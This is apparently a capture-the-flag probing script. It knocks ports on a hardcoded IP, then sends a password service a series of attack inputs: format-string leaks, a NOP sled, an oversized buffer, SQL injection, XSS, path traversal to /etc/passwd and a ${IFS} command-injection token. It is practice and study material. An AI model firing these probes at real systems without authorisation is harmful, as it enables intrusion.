#!/usr/bin/env python3
"""
Simple test - see what happens with different inputs
"""

from pwn import *
import time

context.log_level = 'warn'

target_ip = "13.206.58.35"
target_port = 9999

def knock_ports():
    sequence = [9000, 2600, 1337]
    for port in sequence:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            s.close()
        except:
            pass
        time.sleep(0.2)
    time.sleep(0.8)

def test_input(inp, description):
    print(f"\n[*] Testing: {description}")
    print(f"    Input: {inp[:50]}")
    
    try:
        knock_ports()
        conn = remote(target_ip, target_port, level='error')
        conn.recvuntil(b"password:")
        conn.sendline(inp)
        
        try:
            response = conn.recvall(timeout=3)
            print(f"    Response ({len(response)} bytes): {response[:200]}")
            
            if b"flag" in response.lower() or b"kaal{" in response.lower():
                print(f"\n[!!!] FOUND FLAG: {response}")
                return True
            elif b"granted" in response.lower() or b"success" in response.lower():
                print(f"\n[!] ACCESS GRANTED: {response}")
                return True
            elif b"download" in response.lower() or b"http" in response.lower():
                print(f"\n[!] DOWNLOAD LINK: {response}")
                return True
                
        except EOFError:
            print("    Connection closed immediately")
        except:
            print("    Timeout/error")
        
        conn.close()
    except Exception as e:
        print(f"    Error: {e}")
    
    return False

print("[*] SECTOR-7 Simple Input Testing\n")

# Try null byte
if test_input(b"\x00", "Null byte"):
    exit(0)

# Try empty
if test_input(b"", "Empty input"):
    exit(0)

# Try newline only
if test_input(b"\n", "Just newline"):
    exit(0)

# Try format strings that might leak stack
format_tests = [
    (b"%p", "Single pointer leak"),
    (b"%p %p %p %p %p", "Multiple pointer leaks"),
    (b"%s", "String format"),
    (b"%x" * 20, "Hex dump"),
]

for inp, desc in format_tests:
    if test_input(inp, desc):
        exit(0)
    time.sleep(1)

# Try shellcode-like patterns
if test_input(b"\x90" * 50, "NOP sled"):
    exit(0)

# Try to trigger integer overflow
if test_input(b"A" * 0xFFFF, "Very large input"):
    exit(0)

# Try special characters
special = [
    (b"';--", "SQL injection"),
    (b"<script>", "XSS"),
    (b"../../../etc/passwd", "Path traversal"),
    (b"${IFS}", "Command injection"),
]

for inp, desc in special:
    if test_input(inp, desc):
        exit(0)
    time.sleep(1)

print("\n[*] No success with simple inputs")
